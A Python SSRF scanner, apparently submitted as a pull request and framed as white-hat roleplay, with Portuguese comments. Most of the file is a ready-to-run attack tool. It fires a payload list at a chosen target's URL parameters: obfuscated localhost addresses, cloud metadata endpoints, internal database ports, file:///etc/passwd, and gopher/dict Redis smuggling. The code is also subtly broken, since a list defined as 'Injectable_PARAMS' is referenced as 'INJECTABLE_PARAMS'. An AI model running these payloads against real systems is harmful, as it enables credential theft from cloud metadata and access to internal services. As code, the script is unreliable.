#!/usr/bin/env python3
"""
▓ Roleplay: White Hat — SSRF Scanner ▓
Testa Server-Side Request Forgery em endpoints que aceitam URLs
"""
# PULL REQUEST START
import sys
import json
import urllib.request
import urllib.parse
import urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"

SSRF_PAYLOADS = [
    # Localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://0x7f000001",
    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Internal services
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:27017/",
    # Protocol smuggling
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/INFO",
    "gopher://127.0.0.1:6379/_INFO",
]

Injectable_PARAMS = ["url", "redirect", "callback", "next", "link", "src", "image", "file", "path"]

INJECTABLE_ENDPOINTS = [
    "/api/fetch",
    "/api/proxy",
    "/api/import",
    "/api/webhook",
    "/api/preview",
]


def test_ssrf(url: str) -> list:
    """Testa SSRF em todos os endpoints e parâmetros."""
    findings = []
    for ep in INJECTABLE_ENDPOINTS:
        for param in INJECTABLE_PARAMS:
            for payload in SSRF_PAYLOADS:
                full_url = f"{url}{ep}?{urllib.parse.urlencode({param: payload})}"
                try:
                    req = urllib.request.Request(full_url, method="GET")
                    req.add_header("User-Agent", "Mozilla/5.0")
                    resp = urllib.request.urlopen(req, timeout=5)
                    body = resp.read().decode("utf-8", errors="replace")
                    indicators = [
                        "root:x:", "ami-id", "instance-id",
                        "computeMetadata", "redis_version",
                        "mysql", "PostgreSQL",
                    ]
                    for ind in indicators:
                        if ind in body:
                            findings.append({
                                "endpoint": ep,
                                "param": param,
                                "payload": payload,
                                "indicator": ind,
                                "status": resp.status,
                            })
                            break
                except (urllib.error.URLError, urllib.error.HTTPError, OSError):
                    pass
    return findings


def test_redirect_ssrf(url: str) -> list:
    """Testa SSRF via open redirect."""
    findings = []
    redirect_payloads = [
        "/redirect?url=http://169.254.169.254/",
        "/api/goto?next=http://127.0.0.1:6379/",
        "/login?return=http://0x7f000001/",
    ]
    for payload in redirect_payloads:
        try:
            req = urllib.request.Request(
                url + payload,
                method="GET",
                headers={"User-Agent": "Mozilla/5.0"},
            )
            resp = urllib.request.urlopen(req, timeout=5)
            if resp.status in (301, 302, 303, 307, 308):
                location = resp.headers.get("Location", "")
                if any(s in location for s in ["169.254", "127.0.0.1", "localhost"]):
                    findings.append({
                        "type": "open-redirect-ssrf",
                        "payload": payload,
                        "location": location,
                    })
        except (urllib.error.URLError, urllib.error.HTTPError, OSError):
            pass
    return findings


def main():
    print("[WHITE-HAT] SSRF Scanner")
    print(f"Alvo: {TARGET}")
    print("=" * 50)

    print(f"\nPayloads SSRF: {len(SSRF_PAYLOADS)}")
    print(f"Parâmetros injetáveis: {len(INJECTABLE_PARAMS)}")
    print(f"Endpoints: {len(INJECTABLE_ENDPOINTS)}")

    findings = test_ssrf(TARGET)
    redirect_findings = test_redirect_ssrf(TARGET)
    all_findings = findings + redirect_findings

    print(f"\nVulnerabilidades SSRF: {len(all_findings)}")
    for f in all_findings:
        print(f"  [{f.get('type', 'direct-ssrf').upper()}] {f.get('endpoint', f.get('payload', ''))}")

    print(json.dumps({
        "target": TARGET,
        "total_findings": len(all_findings),
        "direct_ssrf": len(findings),
        "redirect_ssrf": len(redirect_findings),
    }, indent=2))
    print("[WHITE-HAT] SSRF Scan completo")


if __name__ == "__main__":
    main()
# PULL REQUEST END
